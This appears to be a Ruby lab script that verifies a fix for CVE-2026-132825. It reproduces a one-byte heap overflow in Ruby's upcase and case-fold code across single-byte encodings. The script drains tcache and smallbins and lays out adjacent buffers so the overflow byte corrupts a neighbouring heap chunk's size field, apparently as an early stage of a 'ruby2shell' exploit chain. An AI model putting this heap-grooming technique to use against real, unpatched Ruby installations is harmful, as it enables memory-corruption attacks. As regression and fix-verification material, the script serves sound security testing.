#!/usr/bin/env ruby
# Cross-encoding Stage A overflow-byte sweep (CVE-2026-132825 fix series).
#
# Fix commit ruby/ruby@d582f8f changed the case_map loop condition in 14
# single-byte encodings from `to < to_end` to `to_end - to > 1`. This script
# reuses the deterministic glibc Stage A canary geometry from
# ruby2shell-stageA.rb: a primer of 780 SHARP_s (0xDF) chars fills buffer1'
# exactly, then a real string of 'a' + 779 SHARP_s places the one-byte
# expansion overflow onto the size LSB of the adjacent buffer2' chunk.
# mtrace's F-line reports that size field; its low byte is the overflow byte.
#
# Usage:
#   ENC=ISO-8859-1 OP=upcase MTRACE_FD=2 LD_PRELOAD=/abs/lab/preload/mtrace.so \
#     lab/build/plain/ruby-3.4.12-plain/bin/ruby \
#     lab/repro/ruby2shell-crossenc-stageA.rb
#
# OP is upcase (overflow byte 0x53, sizefield 0x353) or fold (0x73 / 0x373).
# No network, no external systems; local process only.
$stdout.sync = true

def marker(s)
  STDERR.write(s)
  STDERR.flush
end

enc_name = ENV.fetch('ENC', 'ISO-8859-1')
op = ENV.fetch('OP', 'upcase')
raise "unsupported OP #{op.inspect}" unless %w[upcase fold].include?(op)

enc = Encoding.find(enc_name)
marker("===SETTLE enc=#{enc_name} op=#{op}===\n")
GC.start

# Drain tcache and smallbin holes for the 0x340 / 0x330 classes so the
# primer's two mapping buffers are carved adjacently from the top chunk.
drain340 = Array.new(512) { "d" * 823 }
drain330 = Array.new(512) { "e" * 800 }

map = ->(s) { op == 'fold' ? s.downcase(:fold) : s.upcase }

marker("===PRIMER===\n")
primer = ("\xDF".b * 780).force_encoding(enc)
t1 = map.call(primer)
raise "primer geometry broken: #{t1.bytesize}" unless t1.bytesize == 1560

marker("===REAL===\n")
s = ("a".b + "\xDF".b * 779).force_encoding(enc)
t2 = map.call(s)
puts "crossenc enc=#{enc_name} op=#{op} out=#{t2.bytesize} NO_ABORT"
